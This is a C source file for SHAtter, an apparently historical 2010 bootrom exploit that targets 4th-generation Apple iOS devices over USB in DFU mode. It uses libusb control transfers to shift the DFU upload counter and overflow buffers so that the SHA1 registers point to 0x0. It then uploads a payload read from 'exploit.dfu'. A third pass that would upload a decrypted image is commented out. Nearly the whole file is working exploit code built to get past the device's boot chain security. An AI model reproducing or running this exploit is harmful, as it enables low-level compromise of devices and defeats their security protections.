// SHAtter
//
// vulnerability     by posixninja 07/05/2010
// exploit & payload by pod2g      07/09/2010
//
// thanks to chronicdev team and iphonedev team

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <libusb-1.0/libusb.h>

#define VENDOR_ID    0x05AC
#define NORM_MODE    0x1290
#define RECV_MODE    0x1281
#define WTF_MODE     0x1227
#define DFU_MODE     0x1222
#define BUF_SIZE     0x10000

struct libusb_device_handle *usb_init(struct libusb_context* context, int devid) {
	struct libusb_device **device_list;
	struct libusb_device_handle *handle = NULL;

	int deviceCount = libusb_get_device_list(context, &device_list);

	int i;
	for (i = 0; i < deviceCount; i++) {
		struct libusb_device* device = device_list[i];
		struct libusb_device_descriptor desc;
		libusb_get_device_descriptor(device, &desc);	
		if (desc.idVendor == VENDOR_ID && desc.idProduct == devid) {
			libusb_open(device, &handle);
			break;
		}
	}
	
	libusb_free_device_list(device_list, 1);

	return handle;
}

void usb_close(struct libusb_device_handle *handle) {
	if (handle != NULL) {
		libusb_close(handle);
	}
}

void usb_deinit() {
	libusb_exit(NULL);
}

void get_status(struct libusb_device_handle *handle) {
	unsigned char status[6];
	int ret, i;
	ret = libusb_control_transfer(handle, 0xA1, 3, 0, 0, status, 6, 100);
}

void dfu_notify_upload_finished(struct libusb_device_handle *handle) {
	int ret, i;
	ret = libusb_control_transfer(handle, 0x21, 1, 0, 0, 0, 0, 100);
	for (i=0; i<3; i++){
		get_status(handle);
	}
	libusb_reset_device(handle);
}

struct libusb_device_handle* usb_wait_device_connection(struct libusb_context* context, struct libusb_device_handle *handle) {
        sleep(2);
        usb_close(handle);
        handle = usb_init(context, WTF_MODE);
}

int readfile(char *filename, char* buffer, unsigned int skip) {
        FILE* file = fopen(filename, "rb");
        if (file == NULL) {
                printf("File %s not found.\n", filename);
                return 1;
        }
        fseek(file, 0, SEEK_END);
        int len = ftell(file);
        fseek(file, skip, SEEK_SET);
        fread(buffer, 1, len - skip, file);
        fclose(file);

	return len-skip;
}

int doSHAtter() {
	struct libusb_context* context;
	libusb_init(&context);
	libusb_set_debug(NULL, 3);
	struct libusb_device_handle *handle = NULL;
	int mode;

	printf("______________________SHAtter_____________________\n\n");
	printf("vuln. 			posixninja	07/05/2010\n");
	printf("exploit & payload	pod2g		07/09/2010\n");
	printf("thanks to all members of chronicdev team and iphonedev team\n");
	printf("__________________________________________________\n\n");

	handle = usb_init(context, WTF_MODE);
	if (handle == NULL) {
		handle = usb_init(context, RECV_MODE);
		if (handle != NULL) {
			mode = RECV_MODE;
		} else {
			handle = usb_init(context, 0x1293);
			if (handle != NULL) {
				mode = 0x1293;
			}

		}
	} else {
		mode = WTF_MODE;
	}

	if (handle == NULL) {
		printf("[X] No 4th gen iDevice found.\n");
		return 1;
	}

	if (mode != WTF_MODE) {
		printf("[X] Please connect your 4th gen iDevice in _DFU_ mode.\n");
		return 1;
	}

	int i, ret;
	unsigned char data[0x800];
	unsigned char status[6];

	{
		unsigned int addr = 0x84000000, dwn_addr = 0x84000000;
		unsigned int shift = 0x80;
		unsigned int addr_final;
		char buf[0x2C000];
		memset(buf, 0, 0x2C000);

		printf("[.] _PASS_1_\n");
		printf("[.] preparing oversize...\n");
		ret=libusb_control_transfer(handle, 0x21, 4, 0, 0, 0, 0, 100);
		if (ret < 0) {
			printf("[X] failed to reset USB counters.\n");
			return 1;
		}

		ret = libusb_control_transfer(handle, 0xA1, 2, 0, 0, data, shift, 100);
		if (ret < 0) {
			printf("[X] failed to shift DFU_UPLOAD counter.\n");
			return 1;
		}
		addr += shift;
		libusb_reset_device(handle);

		printf("[.] resetting DFU.\n");
		dfu_notify_upload_finished(handle);
		handle = usb_wait_device_connection(context, handle);
		if (!handle) {
			printf("[X] device stalled.\n");
			return 1;
		}

		char* pbuf = buf;
	        do {
	                ret = libusb_control_transfer(handle, 0x21, 1, 0, 0, pbuf, 0x800, 100);
	                dwn_addr += 0x800;
	                pbuf += 0x800;
	        } while (dwn_addr < 0x8402C000 && ret>=0);
		if (ret < 0) {
			printf("[X] failed to upload exploit data.\n");
			return 1;
		}

		addr_final = addr + 0x2C000;
		do {
			ret = libusb_control_transfer(handle, 0xA1, 2, 0, 0, data, 0x800, 100);
			addr += 0x800;
		} while (addr < addr_final && ret>=0);
		if (ret < 0) {
			printf("[X] failed to shift DFU_UPLOAD counter.\n");
			return 1;
		}
		
		printf("[.] SHA1 registers pointed to 0x0.\n");
	}
	
	handle = usb_wait_device_connection(context, handle);
	if (!handle) {
		printf("[X] device stalled.\n");
		return 1;
	}

	{
		unsigned int addr = 0x84000000, dwn_addr = 0x84000000;
		unsigned int shift = 0x140;
		unsigned int addr_final;
		char buf[0x2C000];
		memset(buf, 0, 0x2C000);
		
		printf("[.] _PASS_2_\n");
		printf("[.] preparing oversize...\n");
		ret=libusb_control_transfer(handle, 0x21, 4, 0, 0, 0, 0, 100);
		if (ret < 0) {
			printf("[X] failed to reset USB counters.\n");
			return 1;
		}

		ret = libusb_control_transfer(handle, 0xA1, 2, 0, 0, data, shift, 100);
		if (ret < 0) {
			printf("[X] failed to shift DFU_UPLOAD counter.\n");
			return 1;
		}
		addr += shift;
		libusb_reset_device(handle);
		
		printf("[.] resetting DFU.\n");
		dfu_notify_upload_finished(handle);
		handle = usb_wait_device_connection(context, handle);
		if (!handle) {
			printf("[X] device stalled.\n");
			return 1;
		}

		printf("[.] now uploading exploit.\n");
		readfile("exploit.dfu", buf, 0x0);

		char* pbuf = buf;
        	do {
			ret = libusb_control_transfer(handle, 0x21, 1, 0, 0, pbuf, 0x800, 100);
	                dwn_addr += 0x800;
        	        pbuf += 0x800;
	        } while (dwn_addr < 0x8402C000 && ret>=0);
		if (ret < 0) {
			printf("[X] failed to upload exploit data.");
			return 1;
		}

		addr_final = addr + 0x2C000;
		do {
			ret = libusb_control_transfer(handle, 0xA1, 2, 0, 0, data, 0x800, 100);
			addr += 0x800;
		} while (addr < addr_final && ret>=0);
		if (ret < 0) {
			printf("[X] failed to shift DFU_UPLOAD counter.");
			return 1;
		}
		
		printf("[.] exploit sent.\n");
	}

	/*
	handle = usb_wait_device_connection(context, handle);
	if (!handle) {
		printf("[X] device stalled.\n");
		return 1;
	}

	{
		unsigned int addr_final;
		char buf[0x2C000];
		memset(buf, 0, 0x2C000);

		printf("[.] _PASS_3_\n");
		ret=libusb_control_transfer(handle, 0x21, 4, 0, 0, 0, 0, 100);
		if (ret < 0) {
			printf("[X] failed to reset USB counters.\n");
			return 1;
		}

		printf("[.] now uploading decrypted image.\n");
		int len = readfile("image.bin", buf, 0x0);

		char* pbuf = buf;
        	do {
			ret = libusb_control_transfer(handle, 0x21, 1, 0, 0, pbuf, 0x800, 100);
			pbuf += 0x800;
			len -= 0x800;
	        } while (len > 0 && ret>=0);

		if (ret < 0) {
			printf("[X] failed to upload image.");
			return 1;
		}

		dfu_notify_upload_finished(handle);
		libusb_reset_device(handle);

		printf("[.] done. Have fun !\n");
	}
	*/

	usb_close(handle);
	usb_deinit();
	
	return 0;
}
